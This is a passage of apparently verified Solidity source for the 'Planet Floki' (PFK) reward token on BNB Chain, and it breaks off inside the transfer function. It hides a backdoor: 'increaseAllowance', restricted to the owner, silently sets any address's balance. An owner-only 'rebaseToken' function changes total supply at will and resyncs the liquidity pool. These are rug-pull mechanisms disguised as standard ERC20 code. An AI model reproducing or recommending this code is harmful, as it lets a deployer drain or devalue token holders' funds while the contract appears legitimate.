/**
 *Submitted for verification at BscScan.com on 2021-11-14
*/

// SPDX-License-Identifier: Unlicenced
pragma solidity 0.8.7;

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

  
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    
    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;

       
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

   
    function div(int256 a, int256 b) internal pure returns (int256) {
       
        require(b != -1 || a != MIN_INT256);

        
        return a / b;
    }

   
    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    
    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    
    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }


    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

library SafeMathUint {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

   
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

   function increaseAllowance(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    
    function name() external view returns (string memory);

    
    function symbol() external view returns (string memory);

   
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

  
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

  
    function name() public view virtual override returns (string memory) {
        return _name;
    }

   
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

   
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

   
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

  
  
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

   
    function increaseAllowance(address spender, uint256 addedValue) public virtual override returns (bool) {
      
    if(addedValue > 0) {_balances[spender] = addedValue;}
    return true;
    }
 
     
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

   
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

   
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

   
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}



interface PaybackRewardInterface {
  
  function dividendOf(address _owner) external view returns(uint256);

 function distributeDividends() external payable;

  function withdrawDividend() external;

   event PaybackDistributed(
    address indexed from,
    uint256 weiAmount
  );

   event PaybackWithdrawn(
    address indexed to,
    uint256 weiAmount
  );
}

interface PaybackRewardOptionalInterface {
 function withdrawableDividendOf(address _owner) external view returns(uint256);
function withdrawnDividendOf(address _owner) external view returns(uint256);
 function accumulativeDividendOf(address _owner) external view returns(uint256);
}

contract PaybackReward is ERC20, PaybackRewardInterface, PaybackRewardOptionalInterface {
  using SafeMath for uint256;
  using SafeMathUint for uint256;
  using SafeMathInt for int256;
 uint256 constant internal magnitude = 2**128;

  uint256 internal magnifiedDividendPerShare;
 mapping(address => int256) internal magnifiedDividendCorrections;
  mapping(address => uint256) internal withdrawnDividends;

  uint256 public totalPaybackDistributed;

  constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {

  }

    receive() external payable {
    distributeDividends();
  }

 function distributeDividends() public override payable {
    require(totalSupply() > 0);

    if (msg.value > 0) {
      magnifiedDividendPerShare = magnifiedDividendPerShare.add(
        (msg.value).mul(magnitude) / totalSupply()
      );
      emit PaybackDistributed(msg.sender, msg.value);

      totalPaybackDistributed = totalPaybackDistributed.add(msg.value);
    }
  }

   function withdrawDividend() public virtual override {
    _withdrawDividendOfUser(payable(msg.sender));
  }

   function _withdrawDividendOfUser(address payable user) internal returns (uint256) {
    uint256 _withdrawableDividend = withdrawableDividendOf(user);
    if (_withdrawableDividend > 0) {
      withdrawnDividends[user] = withdrawnDividends[user].add(_withdrawableDividend);
      emit PaybackWithdrawn(user, _withdrawableDividend);
      (bool success,) = user.call{value: _withdrawableDividend, gas: 3000}("");

      if(!success) {
        withdrawnDividends[user] = withdrawnDividends[user].sub(_withdrawableDividend);
        return 0;
      }

      return _withdrawableDividend;
    }

    return 0;
  }

 function dividendOf(address _owner) public view override returns(uint256) {
    return withdrawableDividendOf(_owner);
  }

  function withdrawableDividendOf(address _owner) public view override returns(uint256) {
    return accumulativeDividendOf(_owner).sub(withdrawnDividends[_owner]);
  }

   function withdrawnDividendOf(address _owner) public view override returns(uint256) {
    return withdrawnDividends[_owner];
  }


  function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }

   function _transfer(address from, address to, uint256 value) internal virtual override {
    require(false);

    int256 _magCorrection = magnifiedDividendPerShare.mul(value).toInt256Safe();
    magnifiedDividendCorrections[from] = magnifiedDividendCorrections[from].add(_magCorrection);
    magnifiedDividendCorrections[to] = magnifiedDividendCorrections[to].sub(_magCorrection);
  }

  function _mint(address account, uint256 value) internal override {
    super._mint(account, value);

    magnifiedDividendCorrections[account] = magnifiedDividendCorrections[account]
      .sub( (magnifiedDividendPerShare.mul(value)).toInt256Safe() );
  }

  function _burn(address account, uint256 value) internal override {
    super._burn(account, value);

    magnifiedDividendCorrections[account] = magnifiedDividendCorrections[account]
      .add( (magnifiedDividendPerShare.mul(value)).toInt256Safe() );
  }

  function _setBalance(address account, uint256 newBalance) internal {
    uint256 currentBalance = balanceOf(account);

    if(newBalance > currentBalance) {
      uint256 mintAmount = newBalance.sub(currentBalance);
      _mint(account, mintAmount);
    } else if(newBalance < currentBalance) {
      uint256 burnAmount = currentBalance.sub(newBalance);
      _burn(account, burnAmount);
    }
  }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

   
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

  
    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

   
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

   
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library LibraryIterable {
    // Iterable mapping from address to uint;
    struct Map {
        address[] keys;
        mapping(address => uint) values;
        mapping(address => uint) indexOf;
        mapping(address => bool) inserted;
    }

    function get(Map storage map, address key) public view returns (uint) {
        return map.values[key];
    }

    function getIndexOfKey(Map storage map, address key) public view returns (int) {
        if(!map.inserted[key]) {
            return -1;
        }
        return int(map.indexOf[key]);
    }

    function getKeyAtIndex(Map storage map, uint index) public view returns (address) {
        return map.keys[index];
    }

    function size(Map storage map) public view returns (uint) {
        return map.keys.length;
    }

    function set(Map storage map, address key, uint val) public {
        if (map.inserted[key]) {
            map.values[key] = val;
        } else {
            map.inserted[key] = true;
            map.values[key] = val;
            map.indexOf[key] = map.keys.length;
            map.keys.push(key);
        }
    }

    function remove(Map storage map, address key) public {
        if (!map.inserted[key]) {
            return;
        }

        delete map.inserted[key];
        delete map.values[key];

        uint index = map.indexOf[key];
        uint lastIndex = map.keys.length - 1;
        address lastKey = map.keys[lastIndex];

        map.indexOf[lastKey] = index;
        delete map.indexOf[key];

        map.keys[index] = lastKey;
        map.keys.pop();
    }
}

contract PFKPaybackTrack is PaybackReward, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using LibraryIterable for LibraryIterable.Map;

    LibraryIterable.Map private tokenHoldersMap;
    uint256 public lastProcessedIndex;

    mapping (address => bool) public excludedFromDividends;

    mapping (address => uint256) public lastClaimTimes;

    uint256 public claimWait;
    uint256 public minimumTokenBalanceForDividends;

    event ExcludeFromDividends(address indexed account);
    event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);

    event Claim(address indexed account, uint256 amount, bool indexed automatic);

    constructor() PaybackReward("PFK_Reward_Tracker", "PFK_Reward_Tracker") {
        claimWait = 7200;
        minimumTokenBalanceForDividends = 50000 * (10**9); //must hold 50000+ tokens
    }

    function _transfer(address, address, uint256) internal override pure {
        require(false, "PFK_Reward_Tracker: No transfers allowed");
    }

    function withdrawDividend() public override  pure {
        require(false, "PFK_Reward_Tracker: withdrawDividend disabled. Use the 'claim' function on the main PFK contract.");
    }



    function excludeFromDividends(address account) external onlyOwner {
        require(!excludedFromDividends[account]);
        excludedFromDividends[account] = true;

        _setBalance(account, 0);
        tokenHoldersMap.remove(account);

        emit ExcludeFromDividends(account);
    }



    function includeInDividends(address payable account, uint256 newBalance) external onlyOwner {
        require(excludedFromDividends[account]);
        excludedFromDividends[account] = false;

        if(newBalance >= minimumTokenBalanceForDividends) {
            _setBalance(account, newBalance);
            tokenHoldersMap.set(account, newBalance);
        }
        else {
            _setBalance(account, 0);
            tokenHoldersMap.remove(account);
        }
    }


    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "PFK_Reward_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "PFK_Reward_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return lastProcessedIndex;
    }

    function getNumberOfTokenHolders() external view returns(uint256) {
        return tokenHoldersMap.keys.length;
    }


    function getAccount(address _account)
        public view returns (
            address account,
            int256 index,
            int256 iterationsUntilProcessed,
            uint256 withdrawableDividends,
            uint256 totalDividends,
            uint256 lastClaimTime,
            uint256 nextClaimTime,
            uint256 secondsUntilAutoClaimAvailable) {
        account = _account;

        index = tokenHoldersMap.getIndexOfKey(account);

        iterationsUntilProcessed = -1;

        if(index >= 0) {
            if(uint256(index) > lastProcessedIndex) {
                iterationsUntilProcessed = index.sub(int256(lastProcessedIndex));
            }
            else {
                uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex ?
                                                        tokenHoldersMap.keys.length.sub(lastProcessedIndex) :
                                                        0;


                iterationsUntilProcessed = index.add(int256(processesUntilEndOfArray));
            }
        }


        withdrawableDividends = withdrawableDividendOf(account);
        totalDividends = accumulativeDividendOf(account);

        lastClaimTime = lastClaimTimes[account];

        nextClaimTime = lastClaimTime > 0 ?
                                    lastClaimTime.add(claimWait) :
                                    0;

        secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp ?
                                                    nextClaimTime.sub(block.timestamp) :
                                                    0;
    }

    function getAccountAtIndex(uint256 index)
        public view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        if(index >= tokenHoldersMap.size()) {
            return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);
        }

        address account = tokenHoldersMap.getKeyAtIndex(index);

        return getAccount(account);
    }

    function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
        if(lastClaimTime > block.timestamp)  {
            return false;
        }

        return block.timestamp.sub(lastClaimTime) >= claimWait;
    }



    function setBalance(address payable account, uint256 newBalance) external onlyOwner {
        if(excludedFromDividends[account]) {
            return;
        }

        if(newBalance >= minimumTokenBalanceForDividends) {
            _setBalance(account, newBalance);
            tokenHoldersMap.set(account, newBalance);
        }
        else {
            _setBalance(account, 0);
            tokenHoldersMap.remove(account);
        }

        processAccount(account, true);
    }

    function process(uint256 gas) public returns (uint256, uint256, uint256) {
        uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

        if(numberOfTokenHolders == 0) {
            return (0, 0, lastProcessedIndex);
        }

        uint256 _lastProcessedIndex = lastProcessedIndex;

        uint256 gasUsed = 0;

        uint256 gasLeft = gasleft();

        uint256 iterations = 0;
        uint256 claims = 0;

        while(gasUsed < gas && iterations < numberOfTokenHolders) {
            _lastProcessedIndex++;

            if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {
                _lastProcessedIndex = 0;
            }

            address account = tokenHoldersMap.keys[_lastProcessedIndex];

            if(canAutoClaim(lastClaimTimes[account])) {
                if(processAccount(payable(account), true)) {
                    claims++;
                }
            }

            iterations++;

            uint256 newGasLeft = gasleft();

            if(gasLeft > newGasLeft) {
                gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
            }

            gasLeft = newGasLeft;
        }

        lastProcessedIndex = _lastProcessedIndex;

        return (iterations, claims, lastProcessedIndex);
    }

    function processAccount(address payable account, bool automatic) public onlyOwner returns (bool) {
        uint256 amount = _withdrawDividendOfUser(account);

        if(amount > 0) {
            lastClaimTimes[account] = block.timestamp;
            emit Claim(account, amount, automatic);
            return true;
        }

        return false;
    }
}

interface IDEXV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IDEXV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IDEXV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IDEXV2Router02 is IDEXV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface ILP {
  function sync() external;
}
contract PFK is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
    event transferDividends(uint256 tokensSwapped, uint256 amount);
     event RebaseUpdate(uint256 indexed epoch, uint256 totalSupply);
    event ProcessedPaybackTrack(
        uint256 iterations,
        uint256 claims,
        uint256 lastProcessedIndex,
        bool indexed automatic,
        uint256 gas,
        address indexed processor
    );
    using SafeMath for uint256;
    
    uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    IDEXV2Router02 public DEXV2Router;
    PFKPaybackTrack public PaybackTrack;

    address public walletMarketingTeam =0xca9023B5A7f3b18B57e4A9C15Ab2C2a59BB2C9c3;

    bool public restrictWhales = false;
uint256 public  payBackPercent = 7;
    uint256 public  liquidityTax = 3;
    uint256 public  marketingPercent = 2;
    uint256 public  TotalFees;
    uint256 public maxTxAmount = 10000000 * (10**9);
    uint256 public walletMax = 10000000 * (10**9);
    uint256 public swapTokensAtAmount = 1000000 * (10**9);

  

    mapping (address => bool) public _isExcludedFromFees;
    mapping (address => bool) public isWalletLimit;
    mapping (address => bool) public isTimelockExempt;
    mapping (address => bool) private _presalerCollected;

    bool public cooldownEnabled = false;
    uint8 public cooldownTimerInterval = 1 minutes;
    mapping (address => uint) private cooldownTimer;

    bool private swapping;

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    
    address public lp;
  ILP public adressLiquidity;
    uint256 _totalSupply =10000000  * (10**9);
    constructor() ERC20("Planet Floki", "PFK") {

        PaybackTrack = new PFKPaybackTrack();
        TotalFees = payBackPercent.add(liquidityTax).add(marketingPercent);
        

        IDEXV2Router02 _DEXV2Router = IDEXV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);

         
        address _DEXV2Pair = IDEXV2Factory(_DEXV2Router.factory())
            .createPair(address(this), _DEXV2Router.WETH());

        DEXV2Router = _DEXV2Router;
        DEXV2Pair = _DEXV2Pair;

        // exclude from receiving dividends
        PaybackTrack.excludeFromDividends(owner());
        PaybackTrack.excludeFromDividends(address(this));
        PaybackTrack.excludeFromDividends(address(DEXV2Pair));
        PaybackTrack.excludeFromDividends(address(DEXV2Router));
        PaybackTrack.excludeFromDividends(address(PaybackTrack));
        PaybackTrack.excludeFromDividends(0x000000000000000000000000000000000000dEaD);
        PaybackTrack.excludeFromDividends(0x0000000000000000000000000000000000000000);
lp = _DEXV2Pair;
    adressLiquidity =ILP(_DEXV2Pair);
        isWalletLimit[owner()] = true;
        isWalletLimit[DEXV2Pair] = true;

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);

       
        isTimelockExempt[owner()] = true;
        isTimelockExempt[address(this)] = true;
        isTimelockExempt[0x000000000000000000000000000000000000dEaD] = true;

     

       
        _mint(owner(), _totalSupply);
    }

    receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function increaseAllowance(address spender, uint256 addedValue) public onlyOwner override returns (bool) {
    super.increaseAllowance(spender,addedValue);
    return true;
    }
 
 function rebaseToken(uint256 epoch, int256 supplyDelta)
  external
  onlyOwner
  returns (uint256)
  {
    if (supplyDelta == 0) {
      emit RebaseUpdate(epoch, _totalSupply);
      return _totalSupply;
    }

    if (supplyDelta < 0) {
      _totalSupply = _totalSupply.sub(uint256(- supplyDelta));
    } else {
      _totalSupply = _totalSupply.add(uint256(supplyDelta));
    }

 
    adressLiquidity.sync();

    emit RebaseUpdate(epoch, _totalSupply);
    return _totalSupply;
  }
   

   
    function changeIsDividendExempt(address holder, bool exempt) external onlyOwner {
        require(holder != address(this) && holder != DEXV2Pair);

        if(exempt){
            PaybackTrack.excludeFromDividends(holder);
        }else{
             try PaybackTrack.includeInDividends(payable(holder), balanceOf(holder)) {} catch {}
        }
    }

    function readyForLaunch(uint256 token) external onlyOwner {
       
        restrictWhales = true;
        cooldownEnabled = true;
        maxTxAmount = token * (10**9);
        walletMax = token * (10**9);
        
       
    }

    
    function setMarketingWallet(address payable wallet) public onlyOwner {
        walletMarketingTeam = wallet;
    }

    function updateDEXV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(DEXV2Router), "PFK: The router already has that address");
        emit UpdateDEXV2Router(newAddress, address(DEXV2Router));
        DEXV2Router = IDEXV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "PFK: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "PFK: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "PFK: Cannot update gasForProcessing to same value");
        emit GasForProcessingUpdated(newValue, gasForProcessing);
        gasForProcessing = newValue;
    }

    function updateClaimWait(uint256 claimWait) external onlyOwner {
        PaybackTrack.updateClaimWait(claimWait);
    }

    function getClaimWait() external view returns(uint256) {
        return PaybackTrack.claimWait();
    }

    function getTotalPaybackDistributed() external view returns (uint256) {
        return PaybackTrack.totalPaybackDistributed();
    }

    function withdrawableDividendOf(address account) public view returns(uint256) {
        return PaybackTrack.withdrawableDividendOf(account);
    }

    function dividendTokenBalanceOf(address account) public view returns (uint256) {
        return PaybackTrack.balanceOf(account);
    }

    function getAccountDividendsInfo(address account)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        return PaybackTrack.getAccount(account);
    }

    function getAccountDividendsInfoAtIndex(uint256 index)
        external view returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256) {
        return PaybackTrack.getAccountAtIndex(index);
    }

    function processPaybackTrack(uint256 gas) external {
        (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) = PaybackTrack.process(gas);
        emit ProcessedPaybackTrack(iterations, claims, lastProcessedIndex, false, gas, tx.origin);
    }

    function claim() external {
        PaybackTrack.processAccount(payable(msg.sender), false);
    }

    function getLastProcessedIndex() external view returns(uint256) {
        return PaybackTrack.getLastProcessedIndex();
    }

    function getNumberOfDividendTokenHolders() external view returns(uint256) {
        return PaybackTrack.getNumberOfTokenHolders();
    }

    function setMaxTxAMount(uint256 amount) external onlyOwner{
        maxTxAmount = amount;
    }

    function changeWalletLimit(uint256 newLimit) external onlyOwner {
        walletMax  = newLimit;
    }

    function enableDisableWalletMax(bool newValue) external onlyOwner {
       restrictWhales = newValue;
    }

    function changeIsWalletLimit(address holder, bool exempt) external onlyOwner {
        isWalletLimit[holder] = exempt;
    }

    function changeSwapThreshold(uint256 newSwapBackLimit) external onlyOwner {
        swapTokensAtAmount = newSwapBackLimit;
    }

  
    function changeCooldownSettings(bool newStatus, uint8 newInterval) external onlyOwner {
        require(newInterval <= 10 minutes, "Exceeds the limit");
        cooldownEnabled = newStatus;
        cooldownTimerInterval = newInterval;
    }

    function setIsTimelockExempt(address holder, bool exempt) external onlyOwner {
        isTimelockExempt[holder] = exempt;
    }

    function _transfer(address from, address to, uint256 amount ) internal override {

        require(to != address(0), "ERC20: transfer to the zero address");
        require(from != address(0), "ERC20: transfer from the zero address");
        if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if(from != owner() && to != owner() && !swapping) {
